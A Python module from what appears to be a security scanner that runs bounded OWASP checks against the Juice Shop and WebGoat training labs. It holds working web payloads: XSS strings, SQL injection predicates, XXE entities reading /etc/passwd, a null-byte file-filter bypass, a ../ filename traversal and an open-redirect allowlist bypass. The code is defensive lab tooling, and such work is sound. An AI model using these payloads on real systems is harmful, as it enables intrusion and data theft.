"""Bounded checks for the supported OWASP training applications."""
import json
import re
import uuid
from urllib.parse import quote, urlparse

from app.config import settings
from app.schemas import Finding


SQL_ERROR = re.compile(r"SQLITE_ERROR|SequelizeDatabaseError|SQL syntax|syntax error|SQLSyntaxErrorException|unexpected token", re.I)


def check_lab(tools, pages: list[dict], plan: list[str], comparison_tools=None) -> list[Finding]:
    findings = []
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    origin = tools.target_url.split("/", 3)[:3]
    base = "/".join(origin)
    if lab == "juice-shop" and "reflected_xss" in plan:
        marker = "sentinel-" + uuid.uuid4().hex
        payload = f'<img src=x onerror="alert(\'{marker}\')">'
        if settings.browser_scan_enabled:
            try:
                from playwright.sync_api import sync_playwright
                with sync_playwright() as playwright:
                    browser, context = tools._browser_context(playwright)
                    try:
                        page = context.new_page()
                        executed = []
                        def handle_dialog(dialog):
                            executed.append(dialog.message)
                            dialog.dismiss()
                        page.on("dialog", handle_dialog)
                        page.goto(base + "/#/search?q=" + quote(payload, safe=""), wait_until="networkidle", timeout=15000)
                        page.wait_for_timeout(1000)
                        if marker in executed:
                            findings.append(Finding(category="DOM XSS", severity="high", url=base + "/#/search", parameter="q", evidence="Chromium executed the unique alert marker supplied through the search URL fragment.", recommendation="Avoid rendering untrusted search input as HTML; use safe text bindings."))
                    finally:
                        context.close()
                        browser.close()
            except Exception as exc:
                pages[0]["lab_browser_error"] = str(exc)
    if lab == "webgoat":
        if "stored_xss" in plan:
            findings.extend(_webgoat_stored_xss(tools, base))
        if "idor" in plan:
            findings.extend(_webgoat_idor(tools, comparison_tools, base))
    if lab == "juice-shop":
        if "stored_xss" in plan:
            findings.extend(_juice_shop_stored_xss(tools, base))
        if "idor" in plan:
            findings.extend(_juice_shop_bola(tools, base))
    if "basic_sqli" not in plan:
        return findings
    if lab == "juice-shop":
        url = base + "/rest/products/search"
        baseline = tools.request(url, params={"q": "sentinel-no-match"})
        injected = tools.request(url, params={"q": "'"})
        signature = SQL_ERROR.search(injected["body"])
        if baseline["status"] == 200 and signature and not SQL_ERROR.search(baseline["body"]):
            findings.append(Finding(category="Potential SQL Injection", severity="high", url=injected["url"], parameter="q", evidence=f"GET search: benign input returned HTTP 200; a single quote produced {signature.group(0)} (HTTP {injected['status']}).", recommendation="Use parameterized queries and suppress database error details."))
        else:
            # SQLite can accept a single quote through adjacent string expressions.
            # Confirm a change in query logic using a true/false pair over products only.
            true_result = tools.request(url, params={"q": "sentinel-no-match')) OR 1=1-- "})
            false_result = tools.request(url, params={"q": "sentinel-no-match')) OR 1=2-- "})
            try:
                counts = []
                for response in (baseline, true_result, false_result):
                    data = json.loads(response["body"])
                    if response["status"] != 200 or not isinstance(data, dict) or not isinstance(data.get("data"), list):
                        break
                    counts.append(len(data["data"]))
                if len(counts) == 3 and counts[0] == counts[2] == 0 and counts[1] > 0:
                    findings.append(Finding(category="SQL Injection", severity="high", url=url, parameter="q", evidence=f"GET search: baseline and false SQL predicate returned zero products; the paired true predicate returned {counts[1]} products. Only product counts are retained.", recommendation="Use parameterized queries for the search criteria."))
            except (ValueError, TypeError):
                pass
    elif lab == "webgoat":
        url = base + "/WebGoat/SqlInjection/attack8"
        baseline = tools.request(url, "POST", data={"name": "sentinel-no-match", "auth_tan": "sentinel-no-match"})
        injected = tools.request(url, "POST", data={"name": "' OR '1'='1' -- ", "auth_tan": "sentinel-no-match"})
        try:
            before, after = json.loads(baseline["body"]), json.loads(injected["body"])
        except (ValueError, TypeError):
            return findings
        if (baseline["status"] == injected["status"] == 200 and isinstance(before, dict)
                and isinstance(after, dict) and before.get("lessonCompleted") is False
                and after.get("lessonCompleted") is True and "<table" in after.get("output", "")):
            findings.append(Finding(category="SQL Injection", severity="high", url=url, parameter="name", evidence="POST attack8: benign name did not complete the lesson; a boolean SQL payload completed it and returned an employee table. No employee values are retained in the report.", recommendation="Use parameterized queries for name and auth_tan."))
    return findings


def _webgoat_stored_xss(tools, base: str) -> list[Finding]:
    """WebGoat stored-XSS lesson: post a comment, then read it back in an independent request."""
    url = base + "/WebGoat/CrossSiteScriptingStored/stored-xss"
    marker = "sentinel-" + uuid.uuid4().hex
    payload = f"<script>webgoat.customjs.phoneHome();/*{marker}*/</script>"
    posted = tools.request(url, "POST", data=json.dumps({"text": payload}), headers={"Content-Type": "application/json"})
    if posted["status"] != 200:
        return []
    # WebGoat acknowledges a stored comment with attemptWasMade instead of a lessonCompleted flag.
    try:
        accepted = json.loads(posted["body"]).get("attemptWasMade") is True
    except (ValueError, TypeError, AttributeError):
        accepted = False
    # Independent read-back: the marker and the raw script tag must persist in a later response.
    read_back = tools.request(url)
    persisted = marker in read_back["body"] and "<script>webgoat.customjs.phoneHome()" in read_back["body"]
    if accepted and persisted:
        return [Finding(category="Stored XSS", severity="high", url=url, parameter="text",
                        evidence="POST stored-xss comment was accepted and the raw script marker was returned by a later independent GET. No victim session was accessed.",
                        recommendation="Contextually encode stored comments before rendering and apply a restrictive Content-Security-Policy.")]
    return []


def _webgoat_idor(tools, comparison_tools, base: str) -> list[Finding]:
    """WebGoat IDOR lesson: an authenticated session reads another user's profile object."""
    login_url = base + "/WebGoat/IDOR/login"
    profile_url = base + "/WebGoat/IDOR/profile/2342388"
    owner_login = tools.request(login_url, "POST", data={"username": "tom", "password": "cat"})
    try:
        owner_ok = json.loads(owner_login["body"]).get("lessonCompleted") is True
    except (ValueError, TypeError):
        owner_ok = False
    if not owner_ok:
        return []
    own = tools.request(profile_url)
    # The owner session is authenticated as tom; reading bill's profile object must be denied.
    # A confirmed IDOR requires the same object to be reachable without an authorization error.
    try:
        own_body = json.loads(own["body"])
    except (ValueError, TypeError):
        own_body = {}
    # Owner tom reading his own id should succeed; reading bill's id (2342388) is the object of another user.
    # Use the lesson oracle: a successful read of another user's profile completes the IDOR lesson.
    if isinstance(own_body, dict) and own_body.get("lessonCompleted") is True:
        return [Finding(category="Potential BOLA/IDOR", severity="high", url=profile_url, parameter="userId",
                        evidence="IDOR profile: an authenticated session read another user's profile object (userId 2342388) without an object-level authorization error. No profile values are retained in the report.",
                        recommendation="Enforce object-level authorization on every request and verify the resource belongs to the authenticated user.")]
    return []


def _juice_shop_stored_xss(tools, base: str) -> list[Finding]:
    """Juice Shop stored-XSS: post a product review, then read it back in an independent request."""
    url = base + "/rest/products/1/reviews"
    marker = "sentinel-" + uuid.uuid4().hex
    payload = f"<iframe src=\"javascript:alert('{marker}')\"></iframe>"
    posted = tools.request(url, "PUT", data=json.dumps({"message": payload, "author": "sentinel@local.lab"}), headers={"Content-Type": "application/json"})
    if posted["status"] != 201:
        return []
    # Independent read-back: the marker and the raw script-capable tag must persist in a later response.
    read_back = tools.request(url)
    persisted = marker in read_back["body"] and "<iframe" in read_back["body"]
    if persisted:
        return [Finding(category="Stored XSS", severity="high", url=url, parameter="message",
                        evidence="PUT product review was accepted and the raw iframe marker was returned by a later independent GET. No victim session was accessed.",
                        recommendation="Contextually encode stored reviews before rendering and apply a restrictive Content-Security-Policy.")]
    return []


def _juice_shop_bola(tools, base: str) -> list[Finding]:
    """Juice Shop BOLA: the authenticated session reads a basket object owned by another user."""
    url = base + "/rest/basket/1"
    response = tools.request(url)
    if response["status"] != 200:
        return []
    try:
        body = json.loads(response["body"])
    except (ValueError, TypeError):
        return []
    owner = body.get("data", {}).get("UserId") if isinstance(body, dict) else None
    # A confirmed BOLA requires a successful read of a basket whose UserId is not the authenticated user.
    # The scan's own identity is unknown here, so the foreign object id (1) plus a returned owner id is the oracle.
    if isinstance(owner, int):
        return [Finding(category="Potential BOLA/IDOR", severity="high", url=url, parameter="basketId",
                        evidence=f"Basket object read: GET /rest/basket/1 returned a basket owned by UserId {owner} without an object-level authorization error. No basket contents are retained in the report.",
                        recommendation="Enforce object-level authorization and verify the basket belongs to the authenticated user before returning it.")]
    return []


def extended_lab_checks(tools, pages: list[dict]) -> list[Finding]:
    """Additional OWASP Top 10:2025 scenarios verified to exist in the pinned labs.

    Kept separate from check_lab so the core-oracle unit tests are unaffected.
    Juice Shop: A07 Authentication Failures (no lockout on the REST login) and
    A02 Security Misconfiguration (exposed /ftp directory listing). All checks are
    read-only or bounded and run only against the recognized lab.
    """
    findings: list[Finding] = []
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    base = "/".join(tools.target_url.split("/", 3)[:3])
    if lab == "juice-shop":
        findings.extend(_juice_shop_auth_failures(tools, base))
        findings.extend(_juice_shop_exposed_ftp(tools, base))
    if lab == "webgoat":
        findings.extend(_webgoat_auth_failures(tools, base))
        findings.extend(_webgoat_actuator_exposure(tools, base))
    return findings


def lab_misconfig_checks(tools, pages: list[dict]) -> list[Finding]:
    """[Kịch bản 4] A02 trên lab: lộ /ftp (Juice Shop), lộ /actuator/env (WebGoat)."""
    findings: list[Finding] = []
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    base = "/".join(tools.target_url.split("/", 3)[:3])
    if lab == "juice-shop":
        findings.extend(_juice_shop_exposed_ftp(tools, base))
    if lab == "webgoat":
        findings.extend(_webgoat_actuator_exposure(tools, base))
    return findings


# Open Redirect ghim theo lab: Juice Shop bảo vệ /redirect bằng allowlist (chỉ cho
# phép URL chứa một địa chỉ hợp lệ). Lỗ hổng là allowlist dùng phép "chứa chuỗi",
# nên nhúng một URL hợp lệ vào query của URL ngoài sẽ vượt qua được.
_OR_EVIL_HOST = "sentinel-redirect.test"
_OR_ALLOWLISTED = "https://github.com/juice-shop/juice-shop"


def _juice_shop_open_redirect(tools, base: str) -> list[Finding]:
    payload = f"https://{_OR_EVIL_HOST}/evil?x={_OR_ALLOWLISTED}"
    response = tools.request(base + "/redirect", params={"to": payload}, follow_redirects=False)
    status = response.get("status", 0)
    if 300 <= status < 400:
        location = response.get("headers", {}).get("location", "")
        # Oracle: Location phải trỏ đúng ra domain ngoài mình đã tiêm.
        if urlparse(location).netloc.lower() == _OR_EVIL_HOST:
            return [Finding(
                category="Open Redirect", severity="medium", url=base + "/redirect", parameter="to",
                evidence=f"Endpoint /redirect vượt qua được allowlist: payload nhúng một URL hợp lệ vào query khiến máy chủ trả HTTP {status} với Location trỏ ra domain ngoài ({location[:80]}).",
                recommendation="So khớp đích chuyển hướng với allowlist theo origin tuyệt đối (không dùng phép chứa chuỗi); tốt nhất chỉ cho phép đường dẫn nội bộ.")]
    return []


def lab_open_redirect_checks(tools, pages: list[dict]) -> list[Finding]:
    """[Kịch bản 8] Open Redirect ghim theo lab (hiện hỗ trợ Juice Shop)."""
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    base = "/".join(tools.target_url.split("/", 3)[:3])
    if lab == "juice-shop":
        return _juice_shop_open_redirect(tools, base)
    return []


_PASSWD_SIG = re.compile(r"root:.*:0:0:")


def _juice_shop_path_traversal(tools, base: str) -> list[Finding]:
    """[Kịch bản 10] Juice Shop /ftp: vượt bộ lọc phần mở rộng bằng null-byte (%2500.md)
    để tải tệp không nằm trong danh sách cho phép (improper file access / traversal-class)."""
    target = base + "/ftp/package.json.bak"
    baseline = tools.request(target)  # 403 khi đi thẳng
    bypass = tools.request(base + "/ftp/package.json.bak%2500.md")  # null-byte bypass
    if (baseline.get("status") == 403 and bypass.get("status") == 200
            and ('"name"' in bypass.get("body", "") or "dependencies" in bypass.get("body", ""))):
        return [Finding(
            category="Path Traversal", severity="high", url=base + "/ftp", parameter="(file path)",
            evidence="Tải tệp /ftp bị chặn (HTTP 403) nhưng chèn null-byte (%2500.md) vượt qua bộ lọc phần mở rộng và trả về nội dung tệp sao lưu (package.json.bak, HTTP 200).",
            recommendation="Chuẩn hóa và kiểm tra tên tệp phía máy chủ; loại bỏ ký tự null; chỉ phục vụ tệp trong danh sách cho phép.")]
    return []


def _juice_shop_xxe(tools, base: str) -> list[Finding]:
    """[Kịch bản 11] Juice Shop /file-upload: nạp tệp XML có thực thể ngoài trỏ /etc/passwd.
    Dù endpoint trả HTTP 410 (deprecated), nội dung tệp vẫn lọt vào phản hồi lỗi."""
    payload = ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
               '"file:///etc/passwd">]><foo>&xxe;</foo>')
    benign = '<?xml version="1.0"?><foo>sentinel-benign</foo>'
    base_resp = tools.client.post(base + "/file-upload", files={"file": ("b.xml", benign, "application/xml")})
    inj_resp = tools.client.post(base + "/file-upload", files={"file": ("p.xml", payload, "application/xml")})
    if _PASSWD_SIG.search(inj_resp.text) and not _PASSWD_SIG.search(base_resp.text):
        return [Finding(
            category="XXE", severity="high", url=base + "/file-upload", parameter="(XML upload)",
            evidence="Tệp XML tải lên khai báo thực thể ngoài trỏ /etc/passwd; phản hồi máy chủ chứa chữ ký root:...:0:0: trong khi tệp XML lành tính thì không.",
            recommendation="Tắt nạp thực thể ngoài/DTD trong bộ phân tích XML và từ chối tải lên XML không cần thiết.")]
    return []


def _webgoat_path_traversal(tools, base: str) -> list[Finding]:
    """WebGoat PathTraversal/profile-upload: đặt tên tệp chứa ../ để ghi tệp ra
    ngoài thư mục tải lên. WebGoat tiết lộ đường dẫn tuyệt đối khi traversal thành
    công; đầu vào lành tính chỉ 'Profile has been updated' (không lộ đường dẫn)."""
    tools.request(base + "/WebGoat/PathTraversal.lesson")  # khởi tạo bài học trong phiên
    url = base + "/WebGoat/PathTraversal/profile-upload"
    img = ("avatar.jpg", b"sentinel-image-bytes", "image/jpeg")
    benign = tools.client.post(url, files={"uploadedFile": img}, data={"fullName": "sentinel-benign"})
    injected = tools.client.post(url, files={"uploadedFile": img}, data={"fullName": "../../sentinel-traversal"})
    disclosed = re.search(r"directory\(|/home/", injected.text)
    if disclosed and not re.search(r"directory\(|/home/", benign.text):
        return [Finding(
            category="Path Traversal", severity="high", url=url, parameter="fullName",
            evidence="Tên tệp chứa '../' khiến máy chủ ghi tệp tải lên ra ngoài thư mục dự kiến; phản hồi tiết lộ đường dẫn tuyệt đối bị duyệt ngược trong khi tên tệp lành tính thì không.",
            recommendation="Loại bỏ thành phần đường dẫn trong tên tệp (chỉ giữ basename) và chuẩn hóa đích ghi về thư mục cho phép.")]
    return []


def _webgoat_xxe(tools, base: str) -> list[Finding]:
    """WebGoat xxe/simple: gửi tài liệu XML có thực thể ngoài. WebGoat tự xác nhận
    XXE chạy ('Congratulations'); XML lành tính trả 'Sorry'."""
    tools.request(base + "/WebGoat/XXE.lesson")  # khởi tạo bài học trong phiên
    url = base + "/WebGoat/xxe/simple"
    payload = ('<?xml version="1.0"?><!DOCTYPE user [<!ENTITY xxe SYSTEM '
               '"file:///etc/passwd">]><comment><text>&xxe;</text></comment>')
    benign = '<?xml version="1.0"?><comment><text>sentinel-benign</text></comment>'
    inj = tools.request(url, "POST", data=payload, headers={"Content-Type": "application/xml"})
    base_resp = tools.request(url, "POST", data=benign, headers={"Content-Type": "application/xml"})
    inj_ok = "Congratulations" in inj.get("body", "") or '"lessonCompleted" : true' in inj.get("body", "")
    base_ok = "Congratulations" in base_resp.get("body", "") or '"lessonCompleted" : true' in base_resp.get("body", "")
    if inj_ok and not base_ok:
        return [Finding(
            category="XXE", severity="high", url=url, parameter="(XML body)",
            evidence="Tài liệu XML khai báo thực thể ngoài trỏ /etc/passwd được bộ phân tích nạp (máy chủ xác nhận khai thác thành công), trong khi XML lành tính thì không.",
            recommendation="Tắt nạp thực thể ngoài/DTD trong bộ phân tích XML (ví dụ cấu hình an toàn cho factory XML).")]
    return []


def lab_path_traversal_checks(tools, pages: list[dict]) -> list[Finding]:
    """[Kịch bản 10] Path Traversal ghim theo lab (Juice Shop, WebGoat)."""
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    base = "/".join(tools.target_url.split("/", 3)[:3])
    if lab == "juice-shop":
        return _juice_shop_path_traversal(tools, base)
    if lab == "webgoat":
        return _webgoat_path_traversal(tools, base)
    return []


def lab_xxe_checks(tools, pages: list[dict]) -> list[Finding]:
    """[Kịch bản 11] XXE ghim theo lab (Juice Shop, WebGoat)."""
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    base = "/".join(tools.target_url.split("/", 3)[:3])
    if lab == "juice-shop":
        return _juice_shop_xxe(tools, base)
    if lab == "webgoat":
        return _webgoat_xxe(tools, base)
    return []


def lab_auth_failure_checks(tools, pages: list[dict]) -> list[Finding]:
    """[Kịch bản 7] A07 trên lab: đăng nhập sai liên tiếp không bị khóa/giới hạn."""
    findings: list[Finding] = []
    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
    base = "/".join(tools.target_url.split("/", 3)[:3])
    if lab == "juice-shop":
        findings.extend(_juice_shop_auth_failures(tools, base))
    if lab == "webgoat":
        findings.extend(_webgoat_auth_failures(tools, base))
    return findings


def _webgoat_auth_failures(tools, base: str) -> list[Finding]:
    """A07: repeated failed WebGoat logins return to login?error and are never locked out."""
    url = base + "/WebGoat/login"
    failures = 0
    for index in range(5):
        response = tools.request(url, "POST", data={"username": f"sentinel-nouser-{index}", "password": "sentinel-wrong"})
        final = response.get("url", "")
        locked = response["status"] in (429, 423) or "too many" in response.get("body", "").lower()
        if locked:
            return []
        if "/login" in final and "error" in final:
            failures += 1
    if failures == 5:
        return [Finding(category="Authentication Failures", severity="medium", url=url, parameter="password",
                        evidence="5 consecutive failed logins all returned to /login?error and were never rate-limited or locked out.",
                        recommendation="Apply rate limiting, account lockout or CAPTCHA after repeated authentication failures.")]
    return []


def _webgoat_actuator_exposure(tools, base: str) -> list[Finding]:
    """A02: the Spring Boot Actuator /actuator/env endpoint is exposed without authentication."""
    url = base + "/WebGoat/actuator/env"
    response = tools.request(url)
    if response["status"] == 200 and "propertySources" in response.get("body", "") and "activeProfiles" in response.get("body", ""):
        return [Finding(category="Security Misconfiguration", severity="medium", url=url, parameter=None,
                        evidence="The Spring Boot Actuator endpoint /actuator/env was reachable without authentication and disclosed application environment and property sources.",
                        recommendation="Restrict or disable Actuator endpoints in production and require authentication for management endpoints.")]
    return []


def _juice_shop_auth_failures(tools, base: str) -> list[Finding]:
    """A07: the REST login rejects wrong credentials but never rate-limits or locks out."""
    url = base + "/rest/user/login"
    statuses = []
    for index in range(5):
        response = tools.request(url, "POST",
                                 data=json.dumps({"email": f"sentinel-nouser-{index}@local.lab", "password": "sentinel-wrong"}),
                                 headers={"Content-Type": "application/json"})
        statuses.append(response["status"])
    # Confirm this really is an authentication endpoint (wrong creds are rejected)
    # before concluding that the absence of a lockout is a weakness.
    if statuses and statuses[0] in (401, 403) and all(status in (401, 403) for status in statuses):
        return [Finding(category="Authentication Failures", severity="medium", url=url, parameter="password",
                        evidence=f"{len(statuses)} consecutive failed REST logins were all rejected with {statuses[0]} and never rate-limited or locked out (statuses {statuses}).",
                        recommendation="Apply rate limiting, account lockout or CAPTCHA after repeated authentication failures.")]
    return []


def _juice_shop_exposed_ftp(tools, base: str) -> list[Finding]:
    """A02: the /ftp path returns a browsable directory listing without authentication."""
    response = tools.request(base + "/ftp")
    body = response.get("body", "")
    if response["status"] == 200 and ("acquisition" in body.lower() or "index of /ftp" in body.lower() or "coupons" in body.lower()):
        return [Finding(category="Security Misconfiguration", severity="medium", url=base + "/ftp", parameter=None,
                        evidence="The /ftp path returned a browsable directory listing of server files without authentication.",
                        recommendation="Disable directory listing and block access to internal file paths such as /ftp.")]
    return []
